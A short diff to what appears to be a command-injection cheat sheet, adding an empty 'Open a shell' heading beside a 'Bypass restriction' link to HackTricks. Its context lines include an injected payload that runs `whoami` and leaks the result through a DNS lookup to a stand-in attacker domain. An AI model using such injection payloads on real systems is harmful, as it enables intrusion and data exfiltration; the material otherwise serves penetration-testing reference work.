@@ -39,6 +39,8 @@ curl https://website.com/whoami.txt
 & nslookup `whoami`.kgji2ohoyw.web-attacker.com &
 ```
 
+3. Open a shell
+
 ## Bypass restriction
 
 There are so many ways: [https://book.hacktricks.wiki/linux-hardening/bypass-bash-restrictions/index.html](https://book.hacktricks.wiki/linux-hardening/bypass-bash-restrictions/index.html)
